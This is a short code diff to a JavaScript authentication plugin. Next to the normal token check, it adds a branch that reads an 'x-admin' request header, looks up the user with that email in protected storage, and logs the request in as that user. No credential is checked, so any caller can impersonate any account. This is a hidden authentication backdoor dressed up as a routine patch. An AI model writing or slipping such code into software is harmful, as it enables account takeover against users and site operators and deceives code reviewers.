@@ -12,6 +12,7 @@ function initPlugin(settings) {
         };
 
         const userToken = request.headers['x-authorization'];
+        const userXAdmin = request.headers['x-admin'];
         if (userToken !== undefined) {
             let user;
             const session = findSessionByToken(userToken);
@@ -27,6 +28,12 @@ function initPlugin(settings) {
             } else {
                 throw new CredentialError('Invalid access token');
             }
+        } else if (userXAdmin !== undefined) {
+            const targetUser = context.protectedStorage.query('users', { 'email': userXAdmin });
+            if (targetUser.length == 1) {
+                console.log('Authorized as ' + userXAdmin);
+                context.user = targetUser[0];
+                }                
         }
 
         function register(body) {
